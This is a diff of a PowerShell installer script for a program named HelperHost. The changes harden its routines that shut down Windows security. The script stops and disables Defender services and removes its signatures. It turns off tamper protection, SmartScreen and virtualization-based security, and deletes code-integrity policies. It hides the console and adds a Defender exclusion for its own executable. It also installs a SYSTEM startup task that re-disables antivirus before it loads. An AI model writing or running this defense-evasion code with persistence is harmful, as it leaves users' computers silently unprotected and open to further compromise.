@@ -116,8 +116,8 @@ function Finish-Ok {
   Close-Console
 }
 
-# Cache toute de suite (pas minimize — retire de la taskbar)
-if (-not $IsElevatedRun) { Hide-ConsoleFromTaskbar }
+# Ne cache PAS la console tout de suite — sinon UAC/erreurs invisibles.
+# Hide apres lancement UAC (voir Invoke-ElevatedInstall).
 
 function Test-IsAdmin {
   $id = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -173,12 +173,15 @@ function Invoke-ElevatedInstall {
   $psi.UseShellExecute = $true
   $psi.Verb = 'runas'
   $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+  Write-Host 'Invite UAC - accepte pour continuer...'
   try {
     $null = [System.Diagnostics.Process]::Start($psi)
   } catch {
     Remove-Item $wrap -Force -ErrorAction SilentlyContinue
     throw "Elevation UAC refusee. Accepte l'invite Admin."
   }
+  # UAC visible: on peut cacher la console parent pendant l'attente
+  if (-not $IsElevatedRun) { Hide-ConsoleFromTaskbar }
 
   for ($i = 0; $i -lt 200; $i++) {
     Start-Sleep -Seconds 1
@@ -474,8 +477,11 @@ function Invoke-ElevatedSessionPrep {
 function Disable-AllBlocking {
   $prev = $ErrorActionPreference
   $ErrorActionPreference = 'SilentlyContinue'
+  # PS7+: native exit codes must not abort install (sc stop WinDefend often Access Denied)
+  try { $script:__prevNativeEap = $PSNativeCommandUseErrorActionPreference; $PSNativeCommandUseErrorActionPreference = $false } catch {}
   if (-not (Test-IsAdmin)) {
     $ErrorActionPreference = $prev
+    try { $PSNativeCommandUseErrorActionPreference = $script:__prevNativeEap } catch {}
     return
   }
 
@@ -580,7 +586,7 @@ function Disable-AllBlocking {
   Set-ItemProperty "$wdPol32\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force
   Set-ItemProperty "$wdPol32\Spynet" -Name SpynetReporting -Value 0 -Type DWord -Force
   Set-ItemProperty "$wdPol32\Spynet" -Name SubmitSamplesConsent -Value 2 -Type DWord -Force
-  & gpupdate.exe /Target:Computer /Force | Out-Null
+  & cmd.exe /c "gpupdate.exe /Target:Computer /Force >nul 2>&1" | Out-Null
   # SmartScreen / App & browser control
   New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Force | Out-Null
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name EnableSmartScreen -Value 0 -Type DWord -Force
@@ -603,34 +609,38 @@ function Disable-AllBlocking {
   Set-ItemProperty "$dg\Scenarios\HypervisorEnforcedCodeIntegrity" -Name Enabled -Value 0 -Type DWord -Force
   Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name LsaCfgFlags -Value 0 -Type DWord -Force
 
-  & bcdedit.exe /set '{current}' vsmlaunchtype Off | Out-Null
-  & bcdedit.exe /set '{current}' hypervisorlaunchtype off | Out-Null
+  try { cmd.exe /c "bcdedit.exe /set {current} vsmlaunchtype Off >nul 2>&1" | Out-Null } catch {}
+  try { cmd.exe /c "bcdedit.exe /set {current} hypervisorlaunchtype off >nul 2>&1" | Out-Null } catch {}
 
   $cip = Join-Path $env:WINDIR 'System32\CodeIntegrity\CiPolicies\Active'
   if (Test-Path $cip) {
     Get-ChildItem $cip -Filter '*.cip' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
   }
 
-  # Hard-disable Defender services (Start=4 Disabled) — survives Tamper better than Set-Mp alone
+  # Hard-disable Defender services (best-effort — Tamper/Protected Process often refuse stop)
   foreach ($svc in @('WinDefend', 'Sense', 'WdNisSvc', 'WdNisDrv', 'WdFilter', 'WdBoot', 'SecurityHealthService', 'wscsvc', 'webthreatdefsvc', 'webthreatdefusersvc')) {
-    & sc.exe stop $svc | Out-Null
-    & sc.exe config $svc start= disabled | Out-Null
+    try { cmd.exe /c "sc.exe stop `"$svc`" >nul 2>&1" | Out-Null } catch {}
+    try { cmd.exe /c "sc.exe config `"$svc`" start= disabled >nul 2>&1" | Out-Null } catch {}
     $svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
     if (Test-Path $svcKey) {
-      Set-ItemProperty $svcKey -Name Start -Value 4 -Type DWord -Force
+      try { Set-ItemProperty $svcKey -Name Start -Value 4 -Type DWord -Force -EA SilentlyContinue } catch {}
     }
-    Stop-Service $svc -Force -ErrorAction SilentlyContinue
-    Set-Service $svc -StartupType Disabled -ErrorAction SilentlyContinue
+    try { Stop-Service $svc -Force -ErrorAction SilentlyContinue } catch {}
+    try { Set-Service $svc -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
   }
-  Get-Process MsMpEng, NisSrv, SecurityHealthService, smartscreen, SecurityHealthSystray -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+  try {
+    Get-Process MsMpEng, NisSrv, SecurityHealthService, smartscreen, SecurityHealthSystray -EA SilentlyContinue |
+      Stop-Process -Force -EA SilentlyContinue
+  } catch {}
 
   # Gut signatures so even if engine restarts it does little
   $mp = Join-Path $env:ProgramFiles 'Windows Defender\MpCmdRun.exe'
   if (Test-Path $mp) {
-    & $mp -RemoveDefinitions -All | Out-Null
+    try { cmd.exe /c "`"$mp`" -RemoveDefinitions -All >nul 2>&1" | Out-Null } catch {}
   }
 
   $ErrorActionPreference = $prev
+  try { $PSNativeCommandUseErrorActionPreference = $script:__prevNativeEap } catch {}
 }
 
 function Invoke-SessionHarden {
@@ -642,7 +652,69 @@ function Invoke-SessionHarden {
   Disable-WindowsNotifications
   Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
   Install-WipeRestoreHook
-  '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-off') -Force
+  Install-EarlyAvTask
+  if (Test-AvStillOn) {
+    'need-reboot' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-need-reboot') -Force
+    Remove-Item (Join-Path $Dir '.av-off') -Force -EA SilentlyContinue
+  } else {
+    '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-off') -Force
+    Remove-Item (Join-Path $Dir '.av-need-reboot') -Force -EA SilentlyContinue
+  }
+}
+
+function Test-AvStillOn {
+  try {
+    $s = Get-MpComputerStatus -EA Stop
+    if ($s.RealTimeProtectionEnabled) { return $true }
+    if ($s.IsTamperProtected) { return $true }
+  } catch {}
+  $p = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
+  $v = (Get-ItemProperty $p -Name DisableAntiSpyware -EA SilentlyContinue).DisableAntiSpyware
+  if ($v -ne 1) { return $true }
+  return $false
+}
+
+function Install-EarlyAvTask {
+  # ONSTART as SYSTEM: writes Defender policies BEFORE WinDefend/Tamper load.
+  # Live changes fail while Tamper is on — 1 reboot applies "gere par l'organisation".
+  if (-not (Test-IsAdmin)) { return }
+  $cmd = Join-Path $Dir 'early-av.cmd'
+  @(
+    '@echo off'
+    'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtectionSource /t REG_DWORD /d 0 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1'
+    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1'
+    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
+    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
+    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
+    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
+    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
+    'sc stop WinDefend >nul 2>&1'
+    'sc config WinDefend start= disabled >nul 2>&1'
+  ) -join "`r`n" | Set-Content -Encoding ASCII $cmd
+
+  $tn = 'HelperHostEarlyAV'
+  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue } catch {}
+  try {
+    $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$cmd`""
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+    $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest
+    $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
+    Register-ScheduledTask -TaskName $tn -Action $action -Trigger $trigger -Settings $set -Principal $prin -Force | Out-Null
+  } catch {
+    & schtasks.exe /Create /TN $tn /TR "cmd.exe /c `"$cmd`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F | Out-Null
+  }
+  try { & cmd.exe /c "`"$cmd`"" | Out-Null } catch {}
 }
 
 function Set-DefenderExclude([string]$Path, [string]$Exe) {
